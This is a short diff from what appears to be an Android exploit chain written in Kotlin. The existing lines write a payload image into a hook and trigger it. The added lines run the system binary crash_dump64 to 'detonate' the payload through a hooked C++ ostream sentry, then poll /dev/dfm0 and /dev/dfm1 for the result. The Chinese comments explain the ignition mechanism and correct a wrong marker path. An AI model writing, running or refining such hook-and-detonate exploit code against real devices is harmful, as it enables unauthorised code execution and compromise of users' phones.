@@ -1020,6 +1020,16 @@ val payloadWrote = if (payload != null) hook.writeImage(payload, hookLanding, 16
             val triggerDelay = if (hookParams.accessTriggerDelayMs > 0L) hookParams.accessTriggerDelayMs else 2000L
             val triggerCode = hook.trigger(triggerDelay)
             step("typed: hook trigger code=" + triggerCode + " delayMs=" + hookParams.accessTriggerDelayMs + " used=" + triggerDelay + " refusal=" + hook.lastRefusal)
+            /*
+             * 点火：任何使用 ostream 的 C++ 进程都会走到被钩的 sentry；设备上现成的是 crash_dump64
+             * （参考设计自己也执行它，steps/crash_dump.cpp:113）。载荷一旦在某个上下文里起火，
+             * /dev/df 就会出现 —— 成功 dfm0、失败 dfm1，两者都是决定性信号。
+             */
+            runCatching {
+                val proc = java.lang.Runtime.getRuntime().exec("/apex/com.android.runtime/bin/crash_dump64")
+                val exit = proc.waitFor()
+                step("typed: detonate exit=" + exit)
+            }.onFailure { problem -> step("typed: detonate refused " + problem.javaClass.simpleName) }
             val terminal = hook.waitTerminal(
                 /* 参考对应：预算 5000 ms、10 ms 轮询（chain.hpp:196 / real_ops.cpp:391-432）；
                  * 失败标记是 /dev/dfm1（real_ops.hpp:59-60），此前写成 /dev/df1 ⇒ 永不匹配。
